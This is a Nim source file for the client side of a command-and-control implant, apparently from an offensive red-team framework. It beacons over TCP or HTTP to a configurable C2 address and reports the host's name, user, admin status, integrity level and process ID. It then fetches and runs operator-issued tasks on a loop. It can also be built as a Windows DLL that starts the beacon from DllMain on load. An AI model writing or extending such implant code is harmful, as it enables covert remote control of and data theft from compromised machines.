import std/[json, os, jsonutils, strutils]

import winim/lean

when defined(tcp):
  import std/net
elif defined(http):
  import std/httpclient

import modules, communication

import ../clientTasks/index, types

const port {.intdefine.}: int = 1234
const autoConnectTime {.intdefine.}: int = 5000
const ip {.strdefine.}: string = "127.0.0.1"

let app: App = App()

app.ip = ip
app.port = port
app.autoConnectTime = autoConnectTime

when defined(tcp):
  app.socket = newSocket()
elif defined(http):
  app.httpRoot = "http://" & ip & ":" & $port
  app.httpClient = newHttpClient()

var sleepTime = 5

when defined(linux):
    const osType = "linux"
elif defined(windows):
    const osType = "windows"
else:
    const osType = "unknown"

proc handleTask(app: App, jsonNode: JsonNode) =

  let taskId = jsonNode["taskId"].getInt()
  var params: seq[string] = @[]
  for param in jsonNode["data"]:
    params.add param.getStr()
  let taskName = jsonNode["task"].getStr()
  if taskName == "identify":
    app.identify(
      taskId,
      hostname=hostname(),
      username=username(), 
      isAdmin=areWeAdmin(),
      osType=osType,
      windowsVersionInfo=getwindowosinfo(),
      linuxVersionInfo=getlinuxosinfo(),
      ownIntegrity=getintegrity(),
      pid=getCurrentProcessId(),
      pname=getAppFilename()
    )
  elif taskName == "sleep":
    sleepTime = parseInt(params[0])
    app.sendOutput(newTaskOutput(taskId))
  elif taskName == "enumtasks":
    let taskOutput = newTaskOutput(taskId)
    var taskNames: seq[tuple[name: string]] = @[(name: "enumtasks"), (name: "sleep")]
    for task in tasks: taskNames.add (name: task.name)
    taskOutput.addData(Object, "tasks", $(toJson taskNames))
    app.sendOutput(taskOutput)
  else:
    var foundTask = false
    for cTask in tasks:
      if cTask.name == taskName:
        foundTask = true
        cTask.execute(app, taskId, params)
    if not foundTask:
      app.unknownTask(taskId, jsonNode["task"].getStr())

proc receiveCommands(app: App) =
  app.connectToC2()
  while true:
    let tasks = app.fetchTasks()
    if tasks.kind == JArray:
      for task in tasks:
        handleTask app, task
    sleep sleepTime*1000

proc beginConnection() =
  app.receiveCommands()

when defined(library) and defined(windows):
  proc NimMain() {.cdecl, importc.}

  proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
    
    if fdwReason == DLL_PROCESS_ATTACH: 
      MessageBox(0, "Hello, world !", "Nim is Powerful", 0)
      beginConnection()

    return true
else:
  beginConnection()